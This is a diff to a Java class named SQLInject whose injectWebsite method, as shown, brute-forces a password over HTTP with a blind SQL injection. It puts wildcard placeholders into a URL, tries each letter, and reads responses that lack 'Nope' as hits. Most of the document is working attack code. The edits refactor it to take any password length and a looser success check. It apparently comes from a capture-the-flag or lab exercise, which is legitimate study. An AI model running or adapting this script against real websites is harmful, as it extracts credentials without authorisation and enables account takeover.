@@ -21,25 +21,27 @@ public class SQLInject {
      */
     private static String injectWebsite(String baseUrl,int passwordLength){
         char[] alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
-        String password = "";
-        for (int i = 0;i < 8;i++){
+        StringBuilder password = new StringBuilder();
+        for (int i = 0;i < passwordLength;i++){
             //Generate string for placeholder
             String placeholder = "";
-            for (int j = 0;j < 8;j++){
+            for (int j = 0;j < passwordLength;j++){
                 placeholder += (i == j) ? "REPLACE" : "_";
             }
+            //Insert the placeholder into the baseUrl
             String url = baseUrl.replace("REPLACE",placeholder);
             for (int k = 0;k < alphabet.length;k++){
                 String urlWithParams = url.replace("REPLACE",String.valueOf(alphabet[k]));
-                String check = readData(urlWithParams);
-                if(!check.contains("Nope") && !check.contains("HTTP 404 ERROR")){
+                String response = readData(urlWithParams);
+                //Assumption: If doesn't contain Nope, the response has been successful
+                if(!response.toLowerCase().contains("nope") && response.length() > 0){
                     //Valid Letter returned
-                    password += alphabet[k];
+                    password.append(alphabet[k]);
                 }
             }
         }
-        password = (password.length() == 0) ? "Error: Password not found" : password;
-        return password;
+        password = (password.length() == 0) ? new StringBuilder("Error: Password not found") : password;
+        return password.toString();
     }
 
     private static String readData(String urlName){
